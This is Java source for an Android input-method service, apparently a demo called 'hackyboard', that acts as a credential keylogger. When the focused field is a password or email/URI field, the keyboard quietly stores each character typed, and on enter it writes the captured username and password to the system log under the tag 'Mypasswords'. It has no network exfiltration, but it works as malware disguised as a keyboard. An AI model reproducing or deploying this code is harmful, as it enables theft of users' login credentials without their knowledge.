package com.example.hackyboard;

import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.text.InputType;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.view.inputmethod.InputMethodManager;

public class softKeyboard extends InputMethodService
        implements KeyboardView.OnKeyboardActionListener {
    private static final String TAG = "Mypasswords";

    public void softKeyboard() {
    }
    String passwords = "";
    String userName = "";
    boolean password = false;
    boolean username = false;
    private InputMethodManager mInputMethodManager;
    private KeyboardView kv;
    private Keyboard keyboard;
    private StringBuilder mComposing = new StringBuilder();
    @Override
    public void onCreate() {
        super.onCreate();

        mInputMethodManager = (InputMethodManager) getSystemService(INPUT_METHOD_SERVICE);
    }
    @Override
    public View onCreateInputView(){
       kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard,null);
       keyboard = new Keyboard(this, R.xml.qwerty);
       kv.setKeyboard(keyboard);
       kv.setOnKeyboardActionListener(this);
       return kv;
    }

    /**
     * @param i
     * @deprecated
     */
    @Override
    public void onPress(int i) {

    }

    /**
     * @param i
     * @deprecated
     */
    @Override
    public void onRelease(int i) {

    }
    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);
        username = false;
        password = false;
        int variation = attribute.inputType & InputType.TYPE_MASK_VARIATION;
        if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) {
            // Do not display predictions / what the user is typing
            // when they are entering a password.
            Log.d(TAG, "This is a password: ");
            passwords = "";
            password = true;

        }
        if (variation == InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS
                || variation == InputType.TYPE_TEXT_VARIATION_URI
                || variation == InputType.TYPE_TEXT_VARIATION_FILTER) {
            // Our predictions are not useful for e-mail addresses
            // or URIs.
            username = true;
        }
    }

    @Override
    public void onKey(int i, int[] ints) {
        InputConnection ic = getCurrentInputConnection();

        if (i == Keyboard.KEYCODE_DELETE)
        {
            ic.deleteSurroundingText(1,0);
            if (password) {
                passwords = passwords.substring(0, passwords.length() - 1);
            }
            if (username)
            {
                userName= userName.substring(0, userName.length() - 1);
            }

        }
        else if (i == 10) {

            Log.d(TAG, "password: " + userName +": "+ passwords);
        }
        else
        {
            if (isInputViewShown()) {
                if (kv.isShifted()) {
                    i = Character.toUpperCase(i);
                }
            }
            getCurrentInputConnection().commitText(String.valueOf((char) i), 1);
            if (password){
                passwords = passwords + String.valueOf((char) i);
            }
            if (username){
                userName = userName + String.valueOf((char) i);
            }


        }

    }

    /**
     * @param charSequence
     * @deprecated
     */
    @Override
    public void onText(CharSequence charSequence) {

    }

    /**
     * @deprecated
     */
    @Override
    public void swipeLeft() {

    }

    /**
     * @deprecated
     */
    @Override
    public void swipeRight() {

    }

    /**
     * @deprecated
     */
    @Override
    public void swipeDown() {

    }

    /**
     * @deprecated
     */
    @Override
    public void swipeUp() {

    }

}